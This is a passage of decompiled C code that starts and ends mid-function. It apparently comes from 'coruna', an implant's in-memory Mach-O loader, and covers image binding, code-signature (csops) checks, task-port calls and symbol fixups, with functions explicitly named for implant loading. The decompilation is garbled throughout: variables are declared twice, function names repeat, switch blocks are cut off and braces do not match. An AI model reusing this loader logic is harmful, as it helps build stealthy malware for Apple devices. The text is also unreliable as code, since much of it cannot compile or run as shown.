      }
      _free(ptr);
    }
  }
  return u;
}





uint64_t coruna_loader_init_shared_cache(uint64_t *val)
{
  int err;
  uint64_t u;
  long *ptr;
  
  if (val == (uint64_t *)0x0) {
    u = 0xad001;
  }
  else {
    ptr = val + 3;
    if ((*ptr == 0) && (val[2] != 0)) {
      u = coruna_csops(ptr,val[2],*val,val[1]);
      err = (int)u;
      if ((err != 0) && ((err == 0x7003 || ((val[1] == 0 && (err == 0x1e037)))))) {
        u = 0;
        *ptr = 0;
      }
    }
    else {
      u = 0;
    }
  }
  return u;
}





uint64_t coruna_ctx_free(uint64_t *val)
{
  uint64_t u;
  uint64_t size;
  uint64_t *ptr;
  
  if (val == (uint64_t *)0x0) {
    return 0xad001;
  }
  ptr = (uint64_t *)val[1];
  if (ptr[3] == 0) {
    size = coruna_ctx_free(*ptr);
  }
  else {
    u = coruna_ctx_free();
    size = coruna_ctx_free(*ptr);
    ptr[1] = 0;
    *ptr = 0;
    ptr[3] = 0;
    ptr[2] = 0;
    _free(ptr);
    val[0xb] = 0;
    val[10] = 0;
    val[0xd] = 0;
    val[0xc] = 0;
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[1] = 0;
    *val = 0;
    _free(val);
    return u;
  }
  u = size;
fail:
  ptr[1] = 0;
  *ptr = 0;
  ptr[3] = 0;
  ptr[2] = 0;
  _free(ptr);
  val[0xb] = 0;
  val[10] = 0;
  val[0xd] = 0;
  val[0xc] = 0;
  val[7] = 0;
  val[6] = 0;
  val[9] = 0;
  val[8] = 0;
  val[3] = 0;
  val[2] = 0;
  val[5] = 0;
  val[4] = 0;
  val[1] = 0;
  *val = 0;
  _free(val);
  return u;
}





unsigned long coruna_loader_bind_image(long arg,short *val)

{
  uint u;
  unsigned long size;
  uint64_t *copy;
  
  size = 0xad001;
  if ((((arg != 0) && (val != (short *)0x0)) && (*val == 2)) && (1 < (ushort)val[1])
     ) {
    copy = *(uint64_t **)(arg + 8);
    if ((short *)copy[1] == (short *)0x0) {
      size = coruna_loader_set_image(*copy,val);
      if ((int)size == 0) {
        copy[1] = val;
        size = coruna_loader_init_shared_cache(copy);
        if ((int)size != 0) {
          copy[1] = 0;
        }
      }
    }
    else {
      u = 0;
      if ((short *)copy[1] != val) {
        u = 0xad005;
      }
      size = (unsigned long)u;
    }
  }
  return size;
}





uint64_t coruna_loader_teardown(long handle)
{
  uint64_t u;
  long handle;
  uint64_t size;
  uint64_t *ptr;
  long *ptr;
  
  size = 0xad001;
  if (handle == 0) {
    return 0xad001;
  }
  ptr = *(uint64_t **)(handle + 8);
  if (ptr[1] == 0) {
    return 0;
  }
  if (ptr[3] == 0) {
    ptr = (long *)*ptr;
    if (ptr != (long *)0x0) {
      handle = *ptr;
      if ((handle != 0) && ((char)ptr[2] != '\0')) {
        (**(void (**)(handle + 0x20))(handle,ptr[1]);
      }
      size = 0;
      *ptr = 0;
      ptr[1] = 0;
      *(uint8_t *)(ptr + 2) = 0;
    }
  }
  else {
    u = coruna_ctx_free();
    ptr[3] = 0;
    ptr = (long *)*ptr;
    if (ptr != (long *)0x0) {
      handle = *ptr;
      if ((handle != 0) && ((char)ptr[2] != '\0')) {
        (**(void (**)(handle + 0x20))(handle,ptr[1]);
      }
      size = 0;
      *ptr = 0;
      ptr[1] = 0;
      *(uint8_t *)(ptr + 2) = 0;
    }
    ptr[1] = 0;
    return u;
  }
  u = size;
fail:
  ptr[1] = 0;
  return u;
}





uint64_t coruna_loader_csops_check(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = coruna_csops(**(uint64_t **)(handle + 8));
    return u;
  }
  return 0xad001;
}





uint64_t
uint64_t coruna_loader_mach_send(int64_t arg,int64_t arg,uint64_t val,uint64_t id_2,uint64_t *size_3)
{
  uint64_t u;
  uint64_t size;
  uint16_t *ptr;
  uint64_t version;
  uint64_t *buf;
  long scratch;
  
  version = 0xad001;
  if ((((arg != 0) && (arg != 0)) && ((int)val != 0)) && (size_3 != (uint64_t *)0x0))
  {
    buf = *(uint64_t **)(arg + 8);
    ptr = _calloc(1,0x40);
    if (ptr == (uint16_t *)0x0) {
      version = 0xad009;
    }
    else {
      *ptr = 1;
      ((void (**)(void *, long, uint64_t))(ptr + 0x14))[0] = coruna_ctx_free;
      ((void (**)(void *, long, uint64_t))(ptr + 0x18))[0] = coruna_lookup_export_call;
      ((void (**)(void *, long, uint64_t))(ptr + 0x1c))[0] = coruna_loader_set_image_call;
      scratch = 0;
      version = coruna_lookup_export(*buf,arg,val,id_2,&scratch);
      if ((int)version == 0) {
        u = *(uint64_t *)(scratch + 8);
        size = *(uint64_t *)(scratch + 0x10);
        *(long *)(ptr + 4) = scratch;
        *(uint64_t *)(ptr + 8) = u;
        *(int *)(ptr + 0xc) = (int)size;
        *(uint64_t *)(ptr + 0x10) = *(uint64_t *)(scratch + 0x18);
        *size_3 = ptr;
      }
      else {
        coruna_ctx_free(ptr);
      }
    }
  }
  return version;
}





unsigned long coruna_realpath_if_mapped(long arg,uint64_t val)

{
  uint u;
  unsigned long size;
  
  u = 0xad001;
  if (arg != 0) {
    if (*(long *)(*(long *)(arg + 8) + 0x18) != 0) {
      size = coruna_realpath(val,3);
      return size;
    }
    u = 0xad010;
  }
  return (unsigned long)u;
}





unsigned long coruna_call_realpath(long arg,uint64_t val,uint64_t n,uint64_t m)

{
  uint u;
  unsigned long size;
  
  u = 0xad001;
  if (arg != 0) {
    if (*(long *)(*(long *)(arg + 8) + 0x18) != 0) {
      size = coruna_realpath(val,n,m);
      return size;
    }
    u = 0xad010;
  }
  return (unsigned long)u;
}





unsigned long coruna_call_pid_for_task(long arg)

{
  uint u;
  unsigned long size;
  long serial;
  
  u = 0xad001;
  if (arg != 0) {
    serial = *(long *)(*(long *)(arg + 8) + 0x18);
    if (serial != 0) {
      size = coruna_pid_for_task(serial);
      return size;
    }
    u = 0xad010;
  }
  return (unsigned long)u;
}





uint64_t coruna_call_mach_port_deallocate(long handle)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if (handle != 0) {
    handle = *(long *)(*(long *)(handle + 8) + 0x18);
    if (handle == 0) {
      u = 0xad010;
    }
    else {
      u = coruna_mach_port_deallocate_218cc(handle);
    }
  }
  return u;
}





uint64_t coruna_loader_verify_sig(long handle)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if (handle != 0) {
    handle = *(long *)(*(long *)(handle + 8) + 0x18);
    if (handle == 0) {
      u = 0xad010;
    }
    else {
      u = coruna_mach_port_deallocate_2145c(handle);
    }
  }
  return u;
}





uint64_t coruna_call_mach_port_deallocate(long handle,uint64_t val,uint64_t id_2,long addr_2)
{
  uint64_t u;
  
  if ((((handle != 0) && ((int)val != 0)) && ((int)val != -1)) && (addr_2 != 0)) {
    u = coruna_mach_port_deallocate(val,id_2,0,addr_2,0);
    return u;
  }
  return 0xad001;
}





uint64_t coruna_loader_iface_get(long handle)
{
  uint64_t u;
  long handle;
  
  u = 0;
  if (handle != 0) {
    if ((*(long **)(handle + 8) == (long *)0x0) || (handle = **(long **)(handle + 8), handle == 0))
    {
      return 0;
    }
    u = *(uint64_t *)(handle + 8);
  }
  return u;
}





uint64_t coruna_ctx_free(uint64_t *val)
{
  uint64_t u;
  
  if (val == (uint64_t *)0x0) {
    u = 0xad001;
  }
  else {
    if (val[1] == 0) {
      u = 0;
    }
    else {
      u = coruna_loader_ctx_destroy();
    }
    val[5] = 0;
    val[4] = 0;
    val[7] = 0;
    val[6] = 0;
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    _free(val);
  }
  return u;
}





uint64_t coruna_lookup_export_call(long handle,long addr_2,long off_3)
{
  uint64_t u;
  
  if ((((handle != 0) && (addr_2 != 0)) && (off_3 != 0)) && (*(long *)(handle + 8) != 0)) {
    u = coruna_lookup_export();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_loader_set_image_call(long handle)
{
  uint64_t u;
  
  if ((handle != 0) && (*(long *)(handle + 8) != 0)) {
    u = coruna_implant08_via_macho_foreach_loadcmd();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_macho_apply_fixups(long handle)
{
  uint *ptr;
  long *ptr;
  unsigned long *buf;
  unsigned long *str;
  unsigned long *copy;
  unsigned long *data;
  uint u;
  byte err;
  long handle;
  uint *obj;
  unsigned long *block;
  uint *entry;
  unsigned long size;
  int *err;
  int err;
  uint *entry_9;
  unsigned long version;
  uint port;
  unsigned long tag;
  int *status;
  uint kind;
  uint64_t type_id;
  long addr;
  long off;
  unsigned long type_id_8;
  long base;
  uint *entry_10;
  int *flags;
  long ctx_val;
  long serial;
  long scratch;
  
  if (handle == 0) {
    type_id = 0xad001;
  }
  else {
    ctx_val = *(long *)(handle + 0x120);
    if ((((ctx_val == 0) || (base = *(long *)(handle + 0x1b0), base == 0)) ||
        (entry_10 = *(uint **)(handle + 8), entry_10 == (uint *)0x0)) ||
       ((serial = *(long *)(handle + 0x10), serial == 0 ||
        (addr = *(long *)(handle + 0x170), addr == 0)))) {
      type_id = 0x930009;
    }
    else {
      type_id = 0x930009;
      if (*(long *)(handle + 0x1a8) != 0) {
        off = *(long *)(handle + 0x50);
        port = *(uint *)(base + 0x4c);
        handle = coruna_fixup_slide_base(handle);
        type_id = 0x930008;
        if (handle != 0) {
          if (port != 0) {
            obj = (uint *)(ctx_val + (unsigned long)*(uint *)(base + 0x48));
            if (obj < entry_10) {
              return 0x930003;
            }
            ptr = (uint *)(serial + (long)entry_10);
            if (ptr <= obj) {
              return 0x930003;
            }
            entry = obj + (unsigned long)port * 2;
            entry_9 = (uint *)((long)entry - 1);
            if (entry_9 < entry_10) {
              return 0x930003;
            }
            if (ptr <= entry_9) {
              return 0x930003;
            }
            do {
              port = *obj;
              tag = (unsigned long)port;
              if ((int)port < 0) {
                if ((~port & 0x30000000) != 0) {
                  return 0x930002;
                }
                if ((port & 0xf000000) != 0) {
                  return 0x930002;
                }
                tag = tag & 0xffffff;
fail:
                ptr = (long *)(handle + tag);
                if (ptr < *(long **)(handle + 8) ||
                    (long *)(*(long *)(handle + 0x10) + (long)*(long **)(handle + 8)) <= ptr) {
                  return 0x930001;
                }
                *ptr = *ptr + off;
              }
              else if ((obj[1] & 0xffffff) != 0) {
                if ((obj[1] & 0xf6000000) != 0x6000000) {
                  return 0x930002;
                }
                ptr = (long *)(handle + tag);
                if (ptr < *(long **)(handle + 8) ||
                    (long *)(*(long *)(handle + 0x10) + (long)*(long **)(handle + 8)) <= ptr) {
                  return 0x930001;
                }
                *ptr = *ptr + off;
              }
              obj = obj + 2;
            } while (obj < entry);
            ctx_val = *(long *)(handle + 0x120);
            if (ctx_val == 0) {
              return 0x910012;
            }
            entry_10 = *(uint **)(handle + 8);
            if (entry_10 == (uint *)0x0) {
              return 0x910012;
            }
          }
          if (*(long *)(handle + 0x10) == 0) {
            type_id = 0x910012;
          }
          else {
            port = *(uint *)(base + 0x44);
            if (port != 0) {
              obj = (uint *)(ctx_val + (unsigned long)*(uint *)(base + 0x40));
              if (obj < entry_10) {
                return 0x91000a;
              }
              ptr = (uint *)(*(long *)(handle + 0x10) + (long)entry_10);
              if (ptr <= obj) {
                return 0x91000a;
              }
              entry = (uint *)((long)obj + (unsigned long)port * 8 + -1);
              if (entry < entry_10) {
                return 0x91000a;
              }
              if (ptr <= entry) {
                return 0x91000a;
              }
              u = *(uint *)(addr + 0x18);
              ctx_val = coruna_fixup_slide_base(handle);
              if (ctx_val == 0) {
                return 0x930008;
              }
              tag = 0;
              scratch = 0;
              block = (unsigned long *)0x0;
              do {
                if ((obj[tag * 2 + 1] & 0xf6000000) != 0x6000000) {
                  return 0x910002;
                }
                buf = (unsigned long *)(ctx_val + (int)obj[tag * 2]);
                data = *(unsigned long **)(handle + 8);
                str = (unsigned long *)(*(long *)(handle + 0x10) + (long)data);
                if (buf < data || str <= buf) {
                  return 0x910002;
                }
                base = *(long *)(handle + 0x1a8);
                version = (unsigned long)obj[tag * 2 + 1] & 0xffffff;
                copy = (unsigned long *)(base + version * 0x10);
                if (copy < data || str <= copy) {
                  return 0x910002;
                }
                size = *buf;
                type_id_8 = size;
                if ((u >> 4 & 1) != 0) {
                  serial = base + version * 0x10;
                  if (((~*(byte *)(serial + 4) & 0xe) == 0) &&
                     ((*(ushort *)(serial + 6) >> 7 & 1) != 0)) {
                    base = base + version * 0x10;
                    version = size - *(long *)(base + 8);
                    type_id_8 = version;
                    if (version != 0) {
                      err = *(int *)(*(long *)(handle + 0x170) + 0x10);
                      if (err == 0) {
done:
                        type_id_8 = 0;
                      }
                      else {
                        err = *(byte *)(base + 5);
                        status = (int *)(*(long *)(handle + 0x148) + 0x20);
                        kind = 1;
                        do {
                          if (*status == 0x19) {
                            if (((kind & 0xff) <= (uint)err) &&
                               ((uint)err < status[0x10] + (kind & 0xff))) {
                              err = (uint)err - (kind & 0xff);
                              if ((size < *(unsigned long *)(status + (long)err * 0x14 + 0x1a)) ||
                                 (type_id_8 = version,
                                 *(long *)(status + (long)err * 0x14 + 0x1c) +
                                 *(unsigned long *)(status + (long)err * 0x14 + 0x1a) <= size))
                              goto done;
                              break;
                            }
                            kind = kind + status[0x10];
                          }
                          status = (int *)((long)status + (unsigned long)(uint)status[1]);
                          err = err + -1;
                          type_id_8 = 0;
                        } while (err != 0);
                      }
                    }
                  }
                  else {
                    type_id_8 = size - *(long *)(serial + 8);
                  }
                }
                if ((copy != block) &&
                   (type_id = coruna_fixup_resolve_sym(handle,copy,&scratch,0), (int)type_id != 0)) {
                  return type_id;
                }
                if (((u >> 4 & 1) == 0) || (*buf != scratch + type_id_8)) {
                  *buf = scratch + type_id_8;
                }
                tag = tag + 1;
                block = copy;
              } while (tag != port);
            }
            if ((((*(long *)(handle + 0x148) == 0) || (*(long *)(handle + 0x120) == 0)) ||
                (*(long *)(handle + 0x1b0) == 0)) ||
               ((*(long *)(handle + 8) == 0 || (*(long *)(handle + 0x10) == 0)))) {
              type_id = 0x910011;
            }
            else {
              type_id = 0x910011;
              if (*(long *)(handle + 0x1a8) != 0) {
                ctx_val = *(long *)(handle + 0x170);
                if (*(int *)(ctx_val + 0x10) == 0) {
                  type_id = 0;
                }
                else {
                  port = 0;
                  base = *(long *)(handle + 0x120) +
                           (unsigned long)*(uint *)(*(long *)(handle + 0x1b0) + 0x38);
                  serial = *(long *)(handle + 8) - *(long *)(handle + 0x168);
                  status = (int *)(*(long *)(handle + 0x148) + 0x20);
                  do {
                    if (*status == 0x19) {
                      flags = status + 0x12;
                      err = flags + (unsigned long)(uint)status[0x10] * 0x14;
                      if (flags < err) {
cleanup:
                        if ((flags[0x10] & 0xfeU) != 6 || *(unsigned long *)(flags + 10) < 8) {
                          type_id = 0;
check_ok:
                          flags = flags + 0x14;
                          if ((err <= flags) || ((int)type_id != 0)) goto skip;
                          goto cleanup;
                        }
                        u = flags[0x11];
                        tag = base + (unsigned long)u * 4;
                        type_id_8 = *(unsigned long *)(handle + 8);
                        version = *(long *)(handle + 0x10) + type_id_8;
                        if ((type_id_8 <= tag && tag < version) &&
                           (size = *(unsigned long *)(flags + 10) >> 3,
                           tag = (base + (size + u) * 4) - 4,
                           type_id_8 <= tag && tag < version)) {
                          tag = 0;
                          ctx_val = *(long *)(flags + 8) + serial;
                          do {
                            kind = *(uint *)(base + (unsigned long)(u + (int)tag) * 4);
                            if (kind == 0x40000000) {
                              type_id = 0;
                            }
                            else if (kind == 0x80000000) {
                              type_id = 0;
                              *(long *)(ctx_val + tag * 8) =
                                   *(long *)(ctx_val + tag * 8) + serial;
                            }
                            else {
                              version = *(long *)(handle + 0x1a8) + (unsigned long)kind * 0x10;
                              if (version < *(unsigned long *)(handle + 8) ||
                                  *(long *)(handle + 0x10) + *(unsigned long *)(handle + 8) <= version) {
                                type_id = 0x910004;
                                goto skip;
                              }
                              scratch = 0;
                              type_id = coruna_fixup_resolve_sym(handle,version,&scratch,1);
                              if ((int)type_id == 0) {
                                *(long *)(ctx_val + tag * 8) = scratch;
                              }
                            }
                            tag = tag + 1;
                          } while (((tag & 0xffffffff) < size) && ((int)type_id == 0));
                          goto check_ok;
                        }
                        type_id = 0x910005;
skip:
                        ctx_val = *(long *)(handle + 0x170);
                      }
                      else {
                        type_id = 0;
                      }
                    }
                    else {
                      type_id = 0;
                    }
                    status = (int *)((long)status + (unsigned long)(uint)status[1]);
                    port = port + 1;
                  } while (port < *(uint *)(ctx_val + 0x10) && (int)type_id == 0);
                }
              }
            }
          }
        }
      }
    }
  }
  return type_id;
}





long coruna_fixup_slide_base(long handle)
{
  long handle;
  int *err;
  int err;
  
  if (handle == 0) {
fail:
    handle = 0;
  }
  else {
    err = (int *)(*(long *)(handle + 0x148) + 0x20);
    err = *(int *)(*(long *)(handle + 0x170) + 0x10) + 1;
    do {
      err = err + -1;
      if (err == 0) goto fail;
      if ((*err == 0x19) && ((*(byte *)(err + 0xf) >> 1 & 1) != 0)) {
        handle = *(long *)(handle + 0x18) + *(long *)(err + 6);
      }
      else {
        handle = 0;
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
    } while (handle == 0);
  }
  return handle;
}





unsigned long coruna_fixup_resolve_sym(long arg,uint *val,unsigned long *n,int m)

{
  uint u;
  ushort size;
  unsigned long type_id;
  unsigned long version;
  unsigned long cache_46;
  
  type_id = 0xad001;
  u = 0x910003;
  if (m == 0) {
    u = 0x910001;
  }
  version = (unsigned long)u;
  if (((arg != 0) && (val != (uint *)0x0)) && (n != (unsigned long *)0x0)) {
    if (((~(byte)val[1] & 0xe) == 0) &&
       (size = *(ushort *)((long)val + 6),
       ((byte)val[1] & 0x10) != 0 || (size & 0x80) != 0)) {
      type_id = *(long *)(arg + 8) + *(long *)(val + 2);
      *n = type_id;
      if ((size >> 3 & 1) == 0) {
        type_id = 0;
      }
      else {
        *n = type_id | 1;
        type_id = 0;
      }
    }
    else {
      type_id = version;
      if (*(long *)(arg + 0x1b8) != 0) {
        version = *(long *)(arg + 0x1b8) + (unsigned long)*val;
        if ((*(unsigned long *)(arg + 8) <= version) &&
           (version < *(long *)(arg + 0x10) + *(unsigned long *)(arg + 8))) {
          cache_46 = 0;
          version = coruna_readclass_from_image(arg,0,version,0,0,&cache_46);
          if (((int)version != 0x910006) && (type_id = version, (int)version == 0)) {
            *n = cache_46;
          }
        }
      }
    }
  }
  return type_id;
}





uint64_t coruna_macho_apply_chained_fixups(long handle)
{
  unsigned long *ptr;
  byte *ptr;
  long *buf;
  uint *buf;
  uint *str;
  uint *copy;
  uint *data;
  uint *obj;
  long *str;
  uint *block;
  byte err;
  short ls12;
  uint *entry;
  void (*ptr)(void);
  bool status;
  long *copy;
  uint64_t u;
  void *data;
  uint size;
  uint version;
  unsigned long port;
  unsigned long tag;
  unsigned long kind;
  long handle;
  uint type_id;
  byte *obj;
  uint64_t type_id_8;
  unsigned long type_id_9;
  int err;
  long addr;
  long off;
  void *block;
  unsigned long type_id_10;
  long base;
  int status;
  byte *entry;
  byte *entry_9;
  unsigned long unaff_x30;
  unsigned long scratch;
  uint *bootargs;
  
  type_id_8 = 0xad001;
  if (handle == 0) {
    return 0xad001;
  }
  handle = *(long *)(handle + 0x188);
  if (handle != 0) {
    off = *(long *)(handle + 0x120);
    if (off == 0) {
      return 0xad001;
    }
    addr = *(long *)(handle + 0x40);
    base = *(long *)(handle + 0x168);
    size = *(uint *)(handle + 8);
    type_id = *(uint *)(handle + 0xc);
    copy = (long *)coruna_macho_seg19_offset(handle,0,0);
    if (copy == (long *)0x0) {
      return 0x930004;
    }
    if (type_id == 0) {
fail:
      ptr = coruna_fixup_bind_entry;
      if (*(char *)(handle + 0x138) != '\0') {
        ptr = coruna_fixup_bind_lazy;
      }
      type_id_8 = coruna_fixup_run_bindings(handle,ptr,0);
      if ((int)type_id_8 != 0) {
        return type_id_8;
      }
      if ((*(ushort *)(handle + 0x1c0) >> 7 & 1) != 0) {
        return 0;
      }
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
      type_id_8 = coruna_fixup_run_exports(handle,ptr,0);
      return type_id_8;
    }
    addr = addr - base;
    entry_9 = (byte *)(off + (unsigned long)size);
    ptr = entry_9 + type_id;
    type_id_9 = 1;
code_r0x000143f8:
    entry = entry_9 + 1;
    err = *entry_9 >> 4;
    if (8 < err) {
      return 0x930005;
    }
    port = (unsigned long)*entry_9 & 0xf;
    status = (int)type_id_9;
    err = (int)addr;
    type_id_10 = port;
    entry_9 = entry;
    switch(err) {
    default:
      ptr = coruna_fixup_bind_entry;
      if (*(char *)(handle + 0x138) != '\0') {
      ptr = coruna_fixup_bind_lazy;
      }
      type_id_8 = coruna_fixup_run_bindings(handle,ptr,0);
      if ((int)type_id_8 != 0) {
      return type_id_8;
      }
      if ((*(ushort *)(handle + 0x1c0) >> 7 & 1) != 0) {
      return 0;
      }
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
      ___stack_chk_fail();
      }
      type_id_8 = coruna_fixup_run_exports(handle,ptr,0);
      return type_id_8;
    }
    type_id_9 = type_id_10;
    ptr = coruna_fixup_bind_entry;
    if (*(char *)(handle + 0x138) != '\0') {
    ptr = coruna_fixup_bind_lazy;
    }
    type_id_8 = coruna_fixup_run_bindings(handle,ptr,0);
    if ((int)type_id_8 != 0) {
    return type_id_8;
    }
    if ((*(ushort *)(handle + 0x1c0) >> 7 & 1) != 0) {
    return 0;
    }
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
    }
    type_id_8 = coruna_fixup_run_exports(handle,ptr,0);
    return type_id_8;
  }
  if (*(long *)(handle + 0x198) == 0) {
    return 0x910010;
  }
  bootargs = (uint *)0x0;
  u = coruna_block_dispose(handle,*(uint32_t *)(*(long *)(handle + 0x198) + 8),&bootargs);
  entry = bootargs;
  if ((int)u != 0) {
    return u;
  }
  block = *(uint **)(handle + 8);
  buf = (uint *)(*(long *)(handle + 0x10) + (long)block);
  if (buf < block) {
    return 0x920006;
  }
  if (bootargs < block) {
    return 0x920006;
  }
  if (buf <= bootargs) {
    return 0x920006;
  }
  size = *(uint *)(*(long *)(handle + 0x198) + 0xc);
  str = (uint *)((unsigned long)size + (long)bootargs);
  if ((str < bootargs || str < block) || buf < str) {
    return 0x920006;
  }
  if (((*bootargs == 0) && (0x1b < bootargs[1])) && (bootargs[1] < size)) {
    type_id = bootargs[4];
    type_id_9 = (unsigned long)type_id;
    if (type_id == 0) {
      if (bootargs[6] != 0) {
        return 0x920003;
      }
      type_id_9 = 0;
      data = (void *)0x0;
joined_r0x00014a54:
      bootargs = entry;
      if ((entry != (uint *)0x0) && (size != 0)) {
        buf = (uint *)((long)entry + (unsigned long)entry[1]);
        type_id = *buf;
        if (type_id == 0) {
          type_id_8 = 0;
        }
        else {
          scratch = 0;
          block = (uint *)((long)entry + (unsigned long)size);
          do {
            if (buf[scratch + 1] != 0) {
              type_id_8 = 0x920006;
              if ((block < entry) ||
                 (str = (uint *)((long)buf + (unsigned long)buf[scratch + 1]),
                 (((str < entry || block <= str) || (uint *)0xffffffffffffffe7 < str)
                 || str + 6 < entry) || block < str + 6)) break;
              copy = (uint *)((unsigned long)*str + (long)str);
              if ((copy < str || copy < entry) || block < copy) {
done:
                type_id_8 = 0x920006;
                break;
              }
              port = 0;
              while (port < (ushort)str[5]) {
                copy = (uint *)((long)str + port * 2 + 0x16);
                data = (uint *)((unsigned long)*str + (long)str);
                if (((((data < str || copy < str) || data <= copy) ||
                     (uint *)0xfffffffffffffffc < copy) &&
                     (((data < str || copy < str) || data <= copy) ||
                     copy != (uint *)0xfffffffffffffffd) || (uint *)((long)copy + 2U) < str)
                    type_id_8 = 0x920006;
                    break;
                }
                else {
                if (((bootargs[2] < 0x1c) || (size <= bootargs[2])) ||
                u = 0x920003;
                }
                return u;
            }
            type_id_8 = 0;
            scratch = scratch + 1;
          } while (scratch < type_id);
        }
      }
cleanup:
      if (data == (void *)0x0) {
        return type_id_8;
      }
      if ((type_id_9 & 0xffff) == 0) {
        return type_id_8;
      }
      type_id_9 = type_id_9 & 0xffff;
      u = type_id_8;
    }
    else {
      if (((bootargs[2] < 0x1c) || (size <= bootargs[2])) ||
         u = 0x920003;
         }
         return u;
  }
  else {
check_ok:
    u = 0x920003;
  }
  return u;
}





uint64_t coruna_fixup_bind_lazy(long handle,long addr_2)
{
  uint64_t u;
  
  if (((handle != 0) && (addr_2 != 0)) && (*(long *)(addr_2 + 8) != 0)) {
    u = coruna_fixup_bind_entry();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_fixup_bind_entry(long handle,uint64_t *val)
{
  int *err;
  int *status;
  char err;
  uint64_t u;
  int *flags;
  int *count;
  uint64_t scratch;
  
  u = 0xad001;
  scratch = 0;
  if ((((handle != 0) && (val != (uint64_t *)0x0)) && (val[1] != 0)) &&
     (u = coruna_readclass_from_image(handle,*(uint32_t *)((long)val + 0x24),val[1],val[3],
                           *(byte *)(val + 2) & 1,&scratch), (int)u == 0)) {
    count = (int *)*val;
    status = *(int **)(handle + 0x40);
    err = (int *)(*(long *)(handle + 0x48) + (long)status);
    if (((((*(ushort *)(handle + 0x1c0) >> 7 & 1) == 0) ||
         (flags = (int *)val[5], flags == (int *)0x0)) ||
        ((*(uint *)(val + 6) == 0 ||
         ((flags + (unsigned long)*(uint *)(val + 6) * 2 < flags || (count < flags)))))) ||
       (flags + (unsigned long)*(uint *)(val + 6) * 2 <= count)) {
      if ((err < status || count < status) || err <= count) {
        return 0x910007;
      }
    }
    else {
      u = coruna_bind_dlopen_table(handle,&scratch);
      if ((int)u != 0) {
        return u;
      }
    }
    err = *(char *)(val + 4);
    if (err == '\x03') {
      u = 0;
      *count = ((int)scratch - (int)count) + -4;
    }
    else if (err == '\x02') {
      u = 0;
      *count = (int)scratch;
    }
    else if (err == '\x01') {
      u = 0;
      *(uint64_t *)count = scratch;
    }
    else {
      u = 0x91000e;
    }
  }
  return u;
}





uint64_t coruna_fixup_run_bindings(long handle,long addr_2,uint64_t val)
{
  uint64_t u;
  long handle;
  long scratch;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 0x188), handle != 0 && addr_2 != 0)) {
    if (*(int *)(handle + 0x14) == 0) {
      u = 0;
    }
    else {
      scratch = 0;
      u = coruna_block_dispose(handle,*(uint32_t *)(handle + 0x10),&scratch);
      if ((int)u == 0) {
        u = coruna_bzero_4(handle,0,scratch,
                             scratch + (unsigned long)*(uint *)(*(long *)(handle + 0x188) + 0x14),addr_2,
                             val);
      }
    }
  }
  return u;
}





uint64_t coruna_fixup_run_exports(long handle,long addr_2,uint64_t val)
{
  uint64_t u;
  long handle;
  long scratch;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 0x188), handle != 0 && addr_2 != 0)) {
    if (*(int *)(handle + 0x24) == 0) {
      u = 0;
    }
    else {
      scratch = 0;
      u = coruna_block_dispose(handle,*(uint32_t *)(handle + 0x20),&scratch);
      if ((int)u == 0) {
        u = coruna_bzero_4(handle,1,scratch,
                             scratch + (unsigned long)*(uint *)(*(long *)(handle + 0x188) + 0x24),addr_2,
                             val);
      }
    }
  }
  return u;
}





uint64_t coruna_implant_via_fixup_run_exports(long handle,long addr_2,uint64_t val)
{
  void (*ptr)(void);
  uint64_t u;
  unsigned long unaff_x30;
  
  u = 0xad001;
  if ((handle != 0) && (addr_2 != 0)) {
    if (*(long *)(handle + 0x188) == 0) {
      u = 0;
    }
    else {
      u = coruna_fixup_run_bindings(handle,addr_2);
      if ((int)u == 0) {
        if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
        u = coruna_fixup_run_exports(handle,addr_2,val);
        return u;
      }
    }
  }
  return u;
}





unsigned long coruna_bzero_4(long arg,byte val,byte *n,byte *m,void (*p,
                  uint64_t q)

{
  bool status;
  byte count;
  uint type_id;
  unsigned long version;
  long serial_8;
  uint32_t type_id_15;
  byte *buf;
  byte *entry;
  unsigned long kind;
  unsigned long type_id_12;
  int count;
  unsigned long type_id_8;
  byte idx;
  byte *entry_9;
  void *stack_guard;
  byte *sa_saved;
  uint64_t cache_34;
  unsigned long block_ctx;
  uint64_t cache_36;
  void *region;
  unsigned long plist;
  
  version = 0xad001;
  if ((((arg != 0) && (n != (byte *)0x0)) && (m != (byte *)0x0)) &&
     ((n <= m && (p != (void (*)0x0)))) {
    block_ctx = 0;
    cache_34 = 0;
    region = (void *)0x0;
    sa_saved = (byte *)0x0;
    stack_guard = (void *)0x0;
    cache_36 = 1;
    plist = (unsigned long)val << 0x20;
    if (n < m) {
      idx = 0;
      while( true ) {
        entry_9 = n + 1;
        count = *n;
        if (0xd < count >> 4) break;
        type_id_8 = (unsigned long)count & 0xf;
        count = (int)type_id_8;
        n = entry_9;
        switch(count >> 4) {
        default:
          version = 0;
          idx = val ^ 1 | idx;
          break;
        }
        if ((((int)version != 0) || ((idx & 1) != 0)) || (m <= n)) goto load_ok_28;
      }
load_ok_29:
      version = 0x91000d;
load_ok_28:
      if (region != (void *)0x0) {
        _bzero(region,(plist & 0xffffffff) << 3);
        _free(region);
      }
    }
    else {
      version = 0;
    }
  }
  return version;
}





uint64_t
uint64_t coruna_return_zero_15594(int64_t arg,int64_t arg,uint64_t val,uint64_t *id_2,int flags,uint size, int count_2)
{
  long handle;
  unsigned long *ptr;
  long addr;
  unsigned long u;
  unsigned long *buf;
  unsigned long size;
  int err;
  uint64_t version;
  unsigned long port;
  uint64_t *str;
  unsigned long tag;
  unsigned long kind;
  unsigned long scratch;
  unsigned long bootargs;
